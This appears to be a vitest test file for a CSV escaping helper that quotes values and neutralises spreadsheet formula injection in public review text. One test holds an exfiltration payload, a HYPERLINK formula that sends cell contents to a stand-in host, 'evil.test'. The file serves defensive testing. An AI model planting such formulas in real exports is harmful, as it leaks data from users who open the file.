import { describe, it, expect } from "vitest";
import { escapeCsv, rowToCsv } from "./csv";

describe("escapeCsv — CSV correctness", () => {
  it("leaves ordinary values alone", () => {
    expect(escapeCsv("Great app")).toBe("Great app");
    expect(escapeCsv(5)).toBe("5");
  });

  it("quotes values containing a delimiter, quote or newline", () => {
    expect(escapeCsv("crashes, often")).toBe('"crashes, often"');
    expect(escapeCsv('say "hi"')).toBe('"say ""hi"""');
    expect(escapeCsv("line1\nline2")).toBe('"line1\nline2"');
    expect(escapeCsv("line1\r\nline2")).toBe('"line1\r\nline2"');
  });

  it("renders null and undefined as empty", () => {
    expect(escapeCsv(null)).toBe("");
    expect(escapeCsv(undefined)).toBe("");
  });
});

describe("escapeCsv — formula injection", () => {
  // Review bodies and author names come from the public. Anyone can post one.
  it("neutralises every formula lead character", () => {
    expect(escapeCsv("=1+1")).toBe("'=1+1");
    expect(escapeCsv("+1")).toBe("'+1");
    expect(escapeCsv("-1")).toBe("'-1");
    expect(escapeCsv("@SUM(A1)")).toBe("'@SUM(A1)");
    expect(escapeCsv("\tcmd")).toBe("'\tcmd");
  });

  it("neutralises a real-world payload and still quotes it correctly", () => {
    const payload = '=HYPERLINK("http://evil.test?x="&A1,"click me")';
    const out = escapeCsv(payload);
    expect(out.startsWith(`"'=HYPERLINK`)).toBe(true);
    // The apostrophe goes INSIDE the quotes, or the cell no longer parses.
    expect(out.startsWith("'\"")).toBe(false);
  });

  it("does not mangle a value that merely contains those characters later", () => {
    expect(escapeCsv("rating 4-5 stars")).toBe("rating 4-5 stars");
    expect(escapeCsv("great app@work")).toBe("great app@work");
  });
});

describe("rowToCsv", () => {
  it("joins escaped columns", () => {
    expect(rowToCsv(["a", "b,c", "=d"])).toBe('a,"b,c",\'=d');
  });
});
